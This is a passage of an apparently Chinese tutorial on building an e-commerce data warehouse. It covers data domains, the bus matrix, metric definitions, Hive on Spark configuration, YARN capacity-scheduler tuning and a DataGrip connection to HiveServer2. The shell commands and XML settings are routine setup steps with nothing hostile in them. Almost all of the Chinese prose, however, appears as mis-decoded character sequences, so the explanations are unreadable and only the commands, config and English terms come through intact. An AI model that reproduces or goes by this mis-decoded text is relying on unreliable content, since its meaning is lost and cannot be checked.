title="æ˜ç¡®æ•°æ®åŸŸ"></a>æ˜ç¡®æ•°æ®åŸŸ</h4><p>æ•°æ®ä»“åº“æ¨¡å‹è®¾è®¡é™¤æ¨ªå‘çš„åˆ†å±‚å¤–ï¼Œé€šå¸¸ä¹Ÿéœ€è¦æ ¹æ®ä¸šåŠ¡æƒ…å†µè¿›è¡Œçºµå‘åˆ’åˆ†æ•°æ®åŸŸã€‚</p><p>åˆ’åˆ†æ•°æ®åŸŸçš„æ„ä¹‰æ˜¯<strong>ä¾¿äºæ•°æ®çš„ç®¡ç†å’Œåº”ç”¨</strong>ã€‚</p><p>é€šå¸¸å¯ä»¥æ ¹æ®ä¸šåŠ¡è¿‡ç¨‹æˆ–è€…éƒ¨é—¨è¿›è¡Œåˆ’åˆ†ï¼Œæœ¬é¡¹ç›®æ ¹æ®ä¸šåŠ¡è¿‡ç¨‹è¿›è¡Œåˆ’åˆ†ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸€ä¸ªä¸šåŠ¡è¿‡ç¨‹åªèƒ½å±äºä¸€ä¸ªæ•°æ®åŸŸã€‚</p><p>ä¸‹é¢æ˜¯æœ¬æ•°ä»“é¡¹ç›®æ‰€éœ€çš„æ‰€æœ‰ä¸šåŠ¡è¿‡ç¨‹åŠæ•°æ®åŸŸåˆ’åˆ†è¯¦æƒ…ã€‚</p><table><thead><tr><th>æ•°æ®åŸŸ</th><th>ä¸šåŠ¡è¿‡ç¨‹</th></tr></thead><tbody><tr><td>äº¤æ˜“åŸŸ</td><td>åŠ è´­ã€ä¸‹å•ã€å–æ¶ˆè®¢å•ã€æ”¯ä»˜æˆåŠŸã€é€€å•ã€é€€æ¬¾æˆåŠŸ</td></tr><tr><td>æµé‡åŸŸ</td><td>é¡µé¢æµè§ˆã€å¯åŠ¨åº”ç”¨ã€åŠ¨ä½œã€æ›å…‰ã€é”™è¯¯</td></tr><tr><td>ç”¨æˆ·åŸŸ</td><td>æ³¨å†Œã€ç™»å½•</td></tr><tr><td>äº’åŠ¨åŸŸ</td><td>æ”¶è—ã€è¯„ä»·</td></tr><tr><td>å·¥å…·åŸŸ</td><td>ä¼˜æƒ åˆ¸é¢†å–ã€ä¼˜æƒ åˆ¸ä½¿ç”¨ï¼ˆä¸‹å•ï¼‰ã€ä¼˜æƒ åˆ¸ä½¿ç”¨ï¼ˆæ”¯ä»˜ï¼‰</td></tr></tbody></table><h4 id="æ„å»ºä¸šåŠ¡æ€»çº¿çŸ©é˜µ"><a href="#æ„å»ºä¸šåŠ¡æ€»çº¿çŸ©é˜µ" class="headerlink" title="æ„å»ºä¸šåŠ¡æ€»çº¿çŸ©é˜µ"></a>æ„å»ºä¸šåŠ¡æ€»çº¿çŸ©é˜µ</h4><p>ä¸šåŠ¡æ€»çº¿çŸ©é˜µä¸­åŒ…å«ç»´åº¦æ¨¡å‹æ‰€éœ€çš„æ‰€æœ‰äº‹å®ï¼ˆä¸šåŠ¡è¿‡ç¨‹ï¼‰ä»¥åŠç»´åº¦ï¼Œä»¥åŠå„ä¸šåŠ¡è¿‡ç¨‹ä¸å„ç»´åº¦çš„å…³ç³»ã€‚çŸ©é˜µçš„è¡Œæ˜¯ä¸€ä¸ªä¸ªä¸šåŠ¡è¿‡ç¨‹ï¼ŒçŸ©é˜µçš„åˆ—æ˜¯ä¸€ä¸ªä¸ªçš„ç»´åº¦ï¼Œè¡Œåˆ—çš„äº¤ç‚¹è¡¨ç¤ºä¸šåŠ¡è¿‡ç¨‹ä¸ç»´åº¦çš„å…³ç³»ã€‚</p><p>ä¸€ä¸ªä¸šåŠ¡è¿‡ç¨‹å¯¹åº”ç»´åº¦æ¨¡å‹ä¸­ä¸€å¼ äº‹åŠ¡å‹äº‹å®è¡¨ï¼Œä¸€ä¸ªç»´åº¦åˆ™å¯¹åº”ç»´åº¦æ¨¡å‹ä¸­çš„ä¸€å¼ ç»´åº¦è¡¨ã€‚æ‰€ä»¥æ„å»ºä¸šåŠ¡æ€»çº¿çŸ©é˜µçš„è¿‡ç¨‹å°±æ˜¯è®¾è®¡ç»´åº¦æ¨¡å‹çš„è¿‡ç¨‹ã€‚ä½†æ˜¯éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ€»çº¿çŸ©é˜µä¸­é€šå¸¸åªåŒ…å«äº‹åŠ¡å‹äº‹å®è¡¨ï¼Œå¦å¤–ä¸¤ç§ç±»å‹çš„äº‹å®è¡¨éœ€å•ç‹¬è®¾è®¡ã€‚</p><p>æŒ‰ç…§äº‹åŠ¡å‹äº‹å®è¡¨çš„è®¾è®¡æµç¨‹ï¼Œ<strong>é€‰æ‹©ä¸šåŠ¡è¿‡ç¨‹å£°æ˜ç²’åº¦ç¡®è®¤ç»´åº¦ç¡®è®¤äº‹å®</strong>ï¼Œå¾—åˆ°çš„æœ€ç»ˆçš„ä¸šåŠ¡æ€»çº¿çŸ©é˜µè§ä»¥ä¸‹è¡¨æ ¼ã€‚</p><p>åç»­çš„DWDå±‚ä»¥åŠDIMå±‚çš„æ­å»ºéœ€å‚è€ƒä¸šåŠ¡æ€»çº¿çŸ©é˜µã€‚</p><h4 id="æ˜ç¡®ç»Ÿè®¡æŒ‡æ ‡"><a href="#æ˜ç¡®ç»Ÿè®¡æŒ‡æ ‡" class="headerlink" title="æ˜ç¡®ç»Ÿè®¡æŒ‡æ ‡"></a>æ˜ç¡®ç»Ÿè®¡æŒ‡æ ‡</h4><p>æ˜ç¡®ç»Ÿè®¡æŒ‡æ ‡å…·ä½“çš„å·¥ä½œæ˜¯ï¼Œæ·±å…¥åˆ†æéœ€æ±‚ï¼Œæ„å»ºæŒ‡æ ‡ä½“ç³»ã€‚æ„å»ºæŒ‡æ ‡ä½“ç³»çš„ä¸»è¦æ„ä¹‰å°±æ˜¯æŒ‡æ ‡å®šä¹‰æ ‡å‡†åŒ–ã€‚æ‰€æœ‰æŒ‡æ ‡çš„å®šä¹‰ï¼Œéƒ½å¿…é¡»éµå¾ªåŒä¸€å¥—æ ‡å‡†ï¼Œè¿™æ ·èƒ½æœ‰æ•ˆçš„é¿å…æŒ‡æ ‡å®šä¹‰å­˜åœ¨æ­§ä¹‰ï¼ŒæŒ‡æ ‡å®šä¹‰é‡å¤ç­‰é—®é¢˜ã€‚</p><p><strong>1ï¼‰æŒ‡æ ‡ä½“ç³»ç›¸å…³æ¦‚å¿µ</strong></p><p><strong>ï¼ˆ1ï¼‰åŸå­æŒ‡æ ‡</strong></p><p>åŸå­æŒ‡æ ‡åŸºäºæŸä¸€<strong>ä¸šåŠ¡è¿‡ç¨‹</strong>çš„<strong>åº¦é‡å€¼</strong>ï¼Œæ˜¯ä¸šåŠ¡å®šä¹‰ä¸­ä¸å¯å†æ‹†è§£çš„æŒ‡æ ‡ï¼ŒåŸå­æŒ‡æ ‡çš„æ ¸å¿ƒåŠŸèƒ½å°±æ˜¯å¯¹æŒ‡æ ‡çš„<strong>èšåˆé€»è¾‘</strong>è¿›è¡Œäº†å®šä¹‰ã€‚æˆ‘ä»¬å¯ä»¥å¾—å‡ºç»“è®ºï¼ŒåŸå­æŒ‡æ ‡åŒ…å«ä¸‰è¦ç´ ï¼Œåˆ†åˆ«æ˜¯ä¸šåŠ¡è¿‡ç¨‹ã€åº¦é‡å€¼å’Œèšåˆé€»è¾‘ã€‚</p><p>ä¾‹å¦‚<strong>è®¢å•æ€»é¢</strong>å°±æ˜¯ä¸€ä¸ªå…¸å‹çš„åŸå­æŒ‡æ ‡ï¼Œå…¶ä¸­çš„ä¸šåŠ¡è¿‡ç¨‹ä¸ºç”¨æˆ·ä¸‹å•ã€åº¦é‡å€¼ä¸ºè®¢å•é‡‘é¢ï¼Œèšåˆé€»è¾‘ä¸ºsum()æ±‚å’Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯åŸå­æŒ‡æ ‡åªæ˜¯ç”¨æ¥è¾…åŠ©å®šä¹‰æŒ‡æ ‡ä¸€ä¸ªæ¦‚å¿µï¼Œé€šå¸¸ä¸ä¼šå¯¹åº”æœ‰å®é™…ç»Ÿè®¡éœ€æ±‚ä¸ä¹‹å¯¹åº”ã€‚</p><p><strong>ï¼ˆ2ï¼‰æ´¾ç”ŸæŒ‡æ ‡</strong></p><p>æ´¾ç”ŸæŒ‡æ ‡åŸºäºåŸå­æŒ‡æ ‡ï¼Œå…¶ä¸åŸå­æŒ‡æ ‡çš„å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚</p><p>ä¸åŸå­æŒ‡æ ‡ä¸åŒï¼Œæ´¾ç”ŸæŒ‡æ ‡é€šå¸¸ä¼šå¯¹åº”å®é™…çš„ç»Ÿè®¡éœ€æ±‚ã€‚è¯·ä»å›¾ä¸­çš„ä¾‹å­ä¸­ï¼Œä½“ä¼šæŒ‡æ ‡å®šä¹‰æ ‡å‡†åŒ–çš„å«ä¹‰ã€‚</p><p><strong>ï¼ˆ3ï¼‰è¡ç”ŸæŒ‡æ ‡</strong></p><p>è¡ç”ŸæŒ‡æ ‡æ˜¯åœ¨ä¸€ä¸ªæˆ–å¤šä¸ªæ´¾ç”ŸæŒ‡æ ‡çš„åŸºç¡€ä¸Šï¼Œé€šè¿‡å„ç§é€»è¾‘è¿ç®—å¤åˆè€Œæˆçš„ã€‚ä¾‹å¦‚æ¯”ç‡ã€æ¯”ä¾‹ç­‰ç±»å‹çš„æŒ‡æ ‡ã€‚è¡ç”ŸæŒ‡æ ‡ä¹Ÿä¼šå¯¹åº”å®é™…çš„ç»Ÿè®¡éœ€æ±‚ã€‚</p><p><strong>2ï¼‰æŒ‡æ ‡ä½“ç³»å¯¹äºæ•°ä»“å»ºæ¨¡çš„æ„ä¹‰</strong></p><p>é€šè¿‡ä¸Šè¿°ä¸¤ä¸ªå…·ä½“çš„æ¡ˆä¾‹å¯ä»¥çœ‹å‡ºï¼Œç»å¤§å¤šæ•°çš„ç»Ÿè®¡éœ€æ±‚ï¼Œéƒ½å¯ä»¥ä½¿ç”¨åŸå­æŒ‡æ ‡ã€æ´¾ç”ŸæŒ‡æ ‡ä»¥åŠè¡ç”ŸæŒ‡æ ‡è¿™å¥—æ ‡å‡†å»å®šä¹‰ã€‚åŒæ—¶èƒ½å¤Ÿå‘ç°è¿™äº›ç»Ÿè®¡éœ€æ±‚éƒ½ç›´æ¥çš„æˆ–é—´æ¥çš„å¯¹åº”ä¸€ä¸ªæˆ–è€…æ˜¯å¤šä¸ªæ´¾ç”ŸæŒ‡æ ‡ã€‚</p><p>å½“ç»Ÿè®¡éœ€æ±‚è¶³å¤Ÿå¤šæ—¶ï¼Œå¿…ç„¶ä¼šå‡ºç°éƒ¨åˆ†ç»Ÿè®¡éœ€æ±‚å¯¹åº”çš„æ´¾ç”ŸæŒ‡æ ‡ç›¸åŒçš„æƒ…å†µã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥è€ƒè™‘å°†è¿™äº›å…¬å…±çš„æ´¾ç”ŸæŒ‡æ ‡ä¿å­˜ä¸‹æ¥ï¼Œè¿™æ ·åšçš„ä¸»è¦ç›®çš„å°±æ˜¯å‡å°‘é‡å¤è®¡ç®—ï¼Œæé«˜æ•°æ®çš„å¤ç”¨æ€§ã€‚</p><p>è¿™äº›å…¬å…±çš„æ´¾ç”ŸæŒ‡æ ‡ç»Ÿä¸€ä¿å­˜åœ¨æ•°æ®ä»“åº“çš„DWSå±‚ã€‚å› æ­¤DWSå±‚è®¾è®¡ï¼Œå°±å¯ä»¥å‚è€ƒæˆ‘ä»¬æ ¹æ®ç°æœ‰çš„ç»Ÿè®¡éœ€æ±‚æ•´ç†å‡ºçš„æ´¾ç”ŸæŒ‡æ ‡ã€‚</p><p>æŒ‰ç…§ä¸Šè¿°æ ‡å‡†æ•´ç†å‡ºçš„æŒ‡æ ‡ä½“ç³»å¦‚ä¸‹ï¼š</p><p>ï¼ˆ1ï¼‰æ€ç»´å¯¼å›¾ç‰ˆ</p><p>ï¼ˆ2ï¼‰PDFç‰ˆ</p><p>ä»ä¸Šè¿°æŒ‡æ ‡ä½“ç³»ä¸­æŠ½å–å‡ºæ¥çš„æ‰€æœ‰æ´¾ç”ŸæŒ‡æ ‡è§å¦‚ä¸‹è¡¨æ ¼ã€‚</p><h4 id="ç»´åº¦æ¨¡å‹è®¾è®¡"><a href="#ç»´åº¦æ¨¡å‹è®¾è®¡" class="headerlink" title="ç»´åº¦æ¨¡å‹è®¾è®¡"></a>ç»´åº¦æ¨¡å‹è®¾è®¡</h4><p>ç»´åº¦æ¨¡å‹çš„è®¾è®¡å‚ç…§ä¸Šè¿°å¾—åˆ°çš„ä¸šåŠ¡æ€»çº¿çŸ©é˜µå³å¯ã€‚äº‹å®è¡¨å­˜å‚¨åœ¨DWDå±‚ï¼Œç»´åº¦è¡¨å­˜å‚¨åœ¨DIMå±‚ã€‚</p><h4 id="æ±‡æ€»æ¨¡å‹è®¾è®¡"><a href="#æ±‡æ€»æ¨¡å‹è®¾è®¡" class="headerlink" title="æ±‡æ€»æ¨¡å‹è®¾è®¡"></a>æ±‡æ€»æ¨¡å‹è®¾è®¡</h4><p>æ±‡æ€»æ¨¡å‹çš„è®¾è®¡å‚è€ƒä¸Šè¿°æ•´ç†å‡ºçš„æŒ‡æ ‡ä½“ç³»ï¼ˆä¸»è¦æ˜¯æ´¾ç”ŸæŒ‡æ ‡ï¼‰å³å¯ã€‚æ±‡æ€»è¡¨ä¸æ´¾ç”ŸæŒ‡æ ‡çš„å¯¹åº”å…³ç³»æ˜¯ï¼Œ<strong>ä¸€å¼ æ±‡æ€»</strong>è¡¨é€šå¸¸<strong>åŒ…å«</strong>ä¸šåŠ¡è¿‡ç¨‹ç›¸åŒã€ç»Ÿè®¡å‘¨æœŸç›¸åŒã€ç»Ÿè®¡ç²’åº¦ç›¸åŒçš„<strong>å¤šä¸ªæ´¾ç”ŸæŒ‡æ ‡</strong>ã€‚è¯·æ€è€ƒï¼šæ±‡æ€»è¡¨ä¸äº‹å®è¡¨çš„å¯¹åº”å…³ç³»æ˜¯ï¼Ÿ</p><h2 id="ç¬¬6ç« -æ•°æ®ä»“åº“ç¯å¢ƒå‡†å¤‡"><a href="#ç¬¬6ç« -æ•°æ®ä»“åº“ç¯å¢ƒå‡†å¤‡" class="headerlink" title="ç¬¬6ç«  æ•°æ®ä»“åº“ç¯å¢ƒå‡†å¤‡"></a>ç¬¬6ç«  æ•°æ®ä»“åº“ç¯å¢ƒå‡†å¤‡</h2><h3 id="æ•°æ®ä»“åº“è¿è¡Œç¯å¢ƒ"><a href="#æ•°æ®ä»“åº“è¿è¡Œç¯å¢ƒ" class="headerlink" title="æ•°æ®ä»“åº“è¿è¡Œç¯å¢ƒ"></a>æ•°æ®ä»“åº“è¿è¡Œç¯å¢ƒ</h3><h4 id="Hiveç¯å¢ƒæ­å»º"><a href="#Hiveç¯å¢ƒæ­å»º" class="headerlink" title="Hiveç¯å¢ƒæ­å»º"></a>Hiveç¯å¢ƒæ­å»º</h4><p><strong>1ï¼‰Hiveå¼•æ“ç®€ä»‹</strong></p><p>Hiveå¼•æ“åŒ…æ‹¬ï¼šé»˜è®¤MRã€tezã€spark</p><p>Hive on<br>Sparkï¼šHiveæ—¢ä½œä¸ºå­˜å‚¨å…ƒæ•°æ®åˆè´Ÿè´£SQLçš„è§£æä¼˜åŒ–ï¼Œè¯­æ³•æ˜¯HQLè¯­æ³•ï¼Œæ‰§è¡Œå¼•æ“å˜æˆäº†Sparkï¼ŒSparkè´Ÿè´£é‡‡ç”¨RDDæ‰§è¡Œã€‚</p><p>Spark on Hive : Hiveåªä½œä¸ºå­˜å‚¨å…ƒæ•°æ®ï¼ŒSparkè´Ÿè´£SQLè§£æä¼˜åŒ–ï¼Œè¯­æ³•æ˜¯Spark<br>SQLè¯­æ³•ï¼ŒSparkè´Ÿè´£é‡‡ç”¨RDDæ‰§è¡Œã€‚</p><p><strong>2ï¼‰Hive on Sparké…ç½®</strong></p><p><strong>ï¼ˆ1ï¼‰å…¼å®¹æ€§è¯´æ˜</strong></p><p>æ³¨æ„ï¼šå®˜ç½‘ä¸‹è½½çš„Hive3.1.2å’ŒSpark3.0.0é»˜è®¤æ˜¯ä¸å…¼å®¹çš„ã€‚å› ä¸ºHive3.1.2æ”¯æŒçš„Sparkç‰ˆæœ¬æ˜¯2.4.5ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬é‡æ–°ç¼–è¯‘Hive3.1.2ç‰ˆæœ¬ã€‚</p><p>ç¼–è¯‘æ­¥éª¤ï¼šå®˜ç½‘ä¸‹è½½Hive3.1.2æºç ï¼Œä¿®æ”¹pomæ–‡ä»¶ä¸­å¼•ç”¨çš„Sparkç‰ˆæœ¬ä¸º3.0.0ï¼Œå¦‚æœç¼–è¯‘é€šè¿‡ï¼Œç›´æ¥æ‰“åŒ…è·å–jaråŒ…ã€‚å¦‚æœæŠ¥é”™ï¼Œå°±æ ¹æ®æç¤ºï¼Œä¿®æ”¹ç›¸å…³æ–¹æ³•ï¼Œç›´åˆ°ä¸æŠ¥é”™ï¼Œæ‰“åŒ…è·å–jaråŒ…ã€‚</p><p><strong>ï¼ˆ2ï¼‰åœ¨Hiveæ‰€åœ¨èŠ‚ç‚¹éƒ¨ç½²Spark</strong></p><p>å¦‚æœä¹‹å‰å·²ç»éƒ¨ç½²äº†Sparkï¼Œåˆ™è¯¥æ­¥éª¤å¯ä»¥è·³è¿‡</p><p>Sparkå®˜ç½‘ä¸‹è½½jaråŒ…åœ°å€ï¼š</p><p><a href="http://spark.apache.org/downloads.html">http://spark.apache.org/downloads.html</a></p><p>ä¸Šä¼ å¹¶è§£å‹è§£å‹spark-3.0.0-bin-hadoop3.2.tgz</p><p>[atguigu@hadoop102 software]$ tar -zxvf spark-3.0.0-bin-hadoop3.2.tgz -C<br>/opt/module/</p><p>[atguigu@hadoop102 software]$ mv /opt/module/spark-3.0.0-bin-hadoop3.2<br>/opt/module/spark</p><p><strong>ï¼ˆ3ï¼‰é…ç½®SPARK_HOMEç¯å¢ƒå˜é‡</strong></p><p>[atguigu@hadoop102 software]$ sudo vim /etc/profile.d/my_env.sh</p><p>æ·»åŠ å¦‚ä¸‹å†…å®¹</p><p>## SPARK_HOME</p><p>export SPARK_HOME=/opt/module/spark</p><p>export PATH=$PATH:$SPARK_HOME/bin</p><p>source ä½¿å…¶ç”Ÿæ•ˆ</p><p>[atguigu@hadoop102 software]$ source /etc/profile.d/my_env.sh</p><p><strong>ï¼ˆ4ï¼‰åœ¨hiveä¸­åˆ›å»ºsparké…ç½®æ–‡ä»¶</strong></p><p>[atguigu@hadoop102 software]$ vim /opt/module/hive/conf/spark-defaults.conf</p><p>æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼ˆåœ¨æ‰§è¡Œä»»åŠ¡æ—¶ï¼Œä¼šæ ¹æ®å¦‚ä¸‹å‚æ•°æ‰§è¡Œï¼‰</p><p>spark.master yarn</p><p>spark.eventLog.enabled true</p><p>spark.eventLog.dir hdfs://hadoop102:8020/spark-history</p><p>spark.executor.memory 1g</p><p>spark.driver.memory 1g</p><p>åœ¨HDFSåˆ›å»ºå¦‚ä¸‹è·¯å¾„ï¼Œç”¨äºå­˜å‚¨å†å²æ—¥å¿—</p><p>[atguigu@hadoop102 software]$ hadoop fs -mkdir /spark-history</p><p><strong>ï¼ˆ5ï¼‰å‘HDFSä¸Šä¼ Sparkçº¯å‡€ç‰ˆjaråŒ…</strong></p><p>è¯´æ˜1ï¼šç”±äºSpark3.0.0éçº¯å‡€ç‰ˆé»˜è®¤æ”¯æŒçš„æ˜¯hive2.3.7ç‰ˆæœ¬ï¼Œç›´æ¥ä½¿ç”¨ä¼šå’Œå®‰è£…çš„Hive3.1.2å‡ºç°å…¼å®¹æ€§é—®é¢˜ã€‚æ‰€ä»¥é‡‡ç”¨Sparkçº¯å‡€ç‰ˆjaråŒ…ï¼Œä¸åŒ…å«hadoopå’Œhiveç›¸å…³ä¾èµ–ï¼Œé¿å…å†²çªã€‚</p><p>è¯´æ˜2ï¼šHiveä»»åŠ¡æœ€ç»ˆç”±Sparkæ¥æ‰§è¡Œï¼ŒSparkä»»åŠ¡èµ„æºåˆ†é…ç”±Yarnæ¥è°ƒåº¦ï¼Œè¯¥ä»»åŠ¡æœ‰å¯èƒ½è¢«åˆ†é…åˆ°é›†ç¾¤çš„ä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹ã€‚æ‰€ä»¥éœ€è¦å°†Sparkçš„ä¾èµ–ä¸Šä¼ åˆ°HDFSé›†ç¾¤è·¯å¾„ï¼Œè¿™æ ·é›†ç¾¤ä¸­ä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹éƒ½èƒ½è·å–åˆ°ã€‚</p><p>ä¸Šä¼ å¹¶è§£å‹spark-3.0.0-bin-without-hadoop.tgz</p><p>[atguigu@hadoop102 software]$ tar -zxvf<br>/opt/software/spark-3.0.0-bin-without-hadoop.tgz</p><p>ä¸Šä¼ Sparkçº¯å‡€ç‰ˆjaråŒ…åˆ°HDFS</p><p>[atguigu@hadoop102 software]$ hadoop fs -mkdir /spark-jars</p><p>[atguigu@hadoop102 software]$ hadoop fs -put<br>spark-3.0.0-bin-without-hadoop/jars/* /spark-jars</p><p><strong>ï¼ˆ6ï¼‰ä¿®æ”¹hive-site.xmlæ–‡ä»¶</strong></p><p>[atguigu@hadoop102 ~]$ vim /opt/module/hive/conf/hive-site.xml</p><p>æ·»åŠ å¦‚ä¸‹å†…å®¹</p><p>&lt;!â€“Sparkä¾èµ–ä½ç½®ï¼ˆæ³¨æ„ï¼šç«¯å£å·8020å¿…é¡»å’Œnamenodeçš„ç«¯å£å·ä¸€è‡´ï¼‰â€“&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;spark.yarn.jars&lt;/name&gt;</p><p>&lt;value&gt;hdfs://hadoop102:8020/spark-jars/*&lt;/value&gt;</p><p>&lt;/property&gt;</p><p>&lt;!â€“Hiveæ‰§è¡Œå¼•æ“â€“&gt;</p><p>&lt;property&gt;</p><p>&lt;name&gt;hive.execution.engine&lt;/name&gt;</p><p>&lt;value&gt;spark&lt;/value&gt;</p><p>&lt;/property&gt;</p><p><strong>3ï¼‰Hive on Sparkæµ‹è¯•</strong></p><p>ï¼ˆ1ï¼‰å¯åŠ¨hiveå®¢æˆ·ç«¯</p><p>[atguigu@hadoop102 hive]$ bin/hive</p><p>ï¼ˆ2ï¼‰åˆ›å»ºä¸€å¼ æµ‹è¯•è¡¨</p><p>hive (default)&gt; create table student(id int, name string);</p><p>ï¼ˆ3ï¼‰é€šè¿‡insertæµ‹è¯•æ•ˆæœ</p><p>hive (default)&gt; insert into table student values(1,â€™abcâ€™);</p><p>è‹¥ç»“æœå¦‚ä¸‹ï¼Œåˆ™è¯´æ˜é…ç½®æˆåŠŸ</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/bce7a0b2e183b0457f5cdde8c162d748.png" alt="æ—¥ç¨‹è¡¨ ä¸­åº¦å¯ä¿¡åº¦æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><h4 id="Yarnç¯å¢ƒé…ç½®"><a href="#Yarnç¯å¢ƒé…ç½®" class="headerlink" title="Yarnç¯å¢ƒé…ç½®"></a>Yarnç¯å¢ƒé…ç½®</h4><p><strong>1ï¼‰å¢åŠ ApplicationMasterèµ„æºæ¯”ä¾‹</strong></p><p>å®¹é‡è°ƒåº¦å™¨å¯¹æ¯ä¸ªèµ„æºé˜Ÿåˆ—ä¸­åŒæ—¶è¿è¡Œçš„Application<br>Masterå ç”¨çš„èµ„æºè¿›è¡Œäº†é™åˆ¶ï¼Œè¯¥é™åˆ¶é€šè¿‡yarn.scheduler.capacity.maximum-am-resource-percentå‚æ•°å®ç°ï¼Œå…¶é»˜è®¤å€¼æ˜¯0.1ï¼Œè¡¨ç¤ºæ¯ä¸ªèµ„æºé˜Ÿåˆ—ä¸ŠApplication<br>Masteræœ€å¤šå¯ä½¿ç”¨çš„èµ„æºä¸ºè¯¥é˜Ÿåˆ—æ€»èµ„æºçš„10%ï¼Œç›®çš„æ˜¯é˜²æ­¢å¤§éƒ¨åˆ†èµ„æºéƒ½è¢«Application<br>Masterå ç”¨ï¼Œè€Œå¯¼è‡´Map/Reduce Taskæ— æ³•æ‰§è¡Œã€‚</p><p>ç”Ÿäº§ç¯å¢ƒè¯¥å‚æ•°å¯ä½¿ç”¨é»˜è®¤å€¼ã€‚ä½†å­¦ä¹ ç¯å¢ƒï¼Œé›†ç¾¤èµ„æºæ€»æ•°å¾ˆå°‘ï¼Œå¦‚æœåªåˆ†é…10%çš„èµ„æºç»™Application<br>Masterï¼Œåˆ™å¯èƒ½å‡ºç°ï¼ŒåŒä¸€æ—¶åˆ»åªèƒ½è¿è¡Œä¸€ä¸ªJobçš„æƒ…å†µï¼Œå› ä¸ºä¸€ä¸ªApplication<br>Masterä½¿ç”¨çš„èµ„æºå°±å¯èƒ½å·²ç»è¾¾åˆ°10%çš„ä¸Šé™äº†ã€‚æ•…æ­¤å¤„å¯å°†è¯¥å€¼é€‚å½“è°ƒå¤§ã€‚</p><p>ï¼ˆ1ï¼‰åœ¨hadoop102çš„/opt/module/hadoop-3.1.3/etc/hadoop/capacity-scheduler.xmlæ–‡ä»¶ä¸­<strong>ä¿®æ”¹</strong>å¦‚ä¸‹å‚æ•°å€¼</p><p>[atguigu@hadoop102 hadoop]$ vim capacity-scheduler.xml</p><p>&lt;property&gt;</p><p>&lt;name&gt;yarn.scheduler.capacity.maximum-am-resource-percent&lt;/name&gt;</p><p>&lt;value&gt;0.8&lt;/value&gt;</p><p>&lt;/property</p><p>ï¼ˆ2ï¼‰åˆ†å‘capacity-scheduler.xmlé…ç½®æ–‡ä»¶</p><p>[atguigu@hadoop102 hadoop]$ xsync capacity-scheduler.xml</p><p>ï¼ˆ3ï¼‰å…³é—­æ­£åœ¨è¿è¡Œçš„ä»»åŠ¡ï¼Œé‡æ–°å¯åŠ¨yarné›†ç¾¤</p><p>[atguigu@hadoop103 hadoop-3.1.3]$ sbin/stop-yarn.sh</p><p>[atguigu@hadoop103 hadoop-3.1.3]$ sbin/start-yarn.sh</p><h3 id="æ•°æ®ä»“åº“å¼€å‘ç¯å¢ƒ"><a href="#æ•°æ®ä»“åº“å¼€å‘ç¯å¢ƒ" class="headerlink" title="æ•°æ®ä»“åº“å¼€å‘ç¯å¢ƒ"></a>æ•°æ®ä»“åº“å¼€å‘ç¯å¢ƒ</h3><p>æ•°ä»“å¼€å‘å·¥å…·å¯é€‰ç”¨DBeaveræˆ–è€…DataGripã€‚ä¸¤è€…éƒ½éœ€è¦ç”¨åˆ°JDBCåè®®è¿æ¥åˆ°Hiveï¼Œæ•…éœ€è¦å¯åŠ¨HiveServer2ã€‚</p><p><strong>1ï¼‰å¯åŠ¨HiveServer2</strong></p><p>[atguigu@hadoop102 hive]$ hiveserver2</p><p><strong>2ï¼‰é…ç½®DataGripè¿æ¥</strong></p><p><strong>ï¼ˆ1ï¼‰åˆ›å»ºè¿æ¥</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/2c4f63c096e1079aa93cfc2317b65f36.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, æ–‡æœ¬, åº”ç”¨ç¨‹åº, ç”µå­é‚®ä»¶æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>ï¼ˆ2ï¼‰é…ç½®è¿æ¥å±æ€§</strong></p><p>æ‰€æœ‰å±æ€§é…ç½®ï¼Œå’ŒHiveçš„beelineå®¢æˆ·ç«¯é…ç½®ä¸€è‡´å³å¯ã€‚åˆæ¬¡ä½¿ç”¨ï¼Œé…ç½®è¿‡ç¨‹ä¼šæç¤ºç¼ºå°‘JDBCé©±åŠ¨ï¼ŒæŒ‰ç…§æç¤ºä¸‹è½½å³å¯ã€‚</p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/8abb9efbe0512cd0f64fabdaaa697e1d.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, åº”ç”¨ç¨‹åº, ç”µå­é‚®ä»¶æè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>3ï¼‰æµ‹è¯•ä½¿ç”¨</strong></p><p><strong>åˆ›å»ºæ•°æ®åº“gmallï¼Œå¹¶è§‚å¯Ÿæ˜¯å¦åˆ›å»ºæˆåŠŸã€‚</strong></p><p><strong>ï¼ˆ1ï¼‰åˆ›å»ºæ•°æ®åº“</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/776073b0a8029c742544c71c93991b7d.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, æ–‡æœ¬, åº”ç”¨ç¨‹åºæè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>ï¼ˆ2ï¼‰æŸ¥çœ‹æ•°æ®åº“</strong></p><p><img src="https://snowgo.top/medias/medias/%E7%94%B5%E5%95%86%E6%95%B0%E4%BB%935.0/fa877779fb43f2aa89a925ddbe79f537.png" alt="å›¾å½¢ç”¨æˆ·ç•Œé¢, åº”ç”¨ç¨‹åº, Wordæè¿°å·²è‡ªåŠ¨ç”Ÿæˆ"></p><p><strong>ï¼ˆ3ï¼‰ä¿®æ”¹è¿æ¥ï¼ŒæŒ‡æ˜è¿æ¥æ•°æ®åº“</strong></p><p><img 